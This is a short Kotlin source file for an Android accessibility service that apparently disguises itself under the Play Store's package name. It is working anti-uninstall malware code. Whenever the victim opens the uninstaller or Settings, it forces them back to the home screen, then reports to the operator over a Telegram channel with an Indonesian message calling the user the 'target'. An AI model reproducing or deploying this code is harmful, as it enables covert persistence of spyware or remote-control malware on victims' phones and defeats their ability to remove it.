package com.android.vending.service
import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.content.Intent

class AntiUninstallService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val className = event.className?.toString() ?: ""
        if (className.contains("UninstallerActivity") || className.contains("Settings")) {
            val home = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(home)
            TelegramEngine.send("🚫 TARGET COBA UNINSTALL! SISTEM DIGAGALKAN.")
        }
    }
    override fun onInterrupt() {}
}
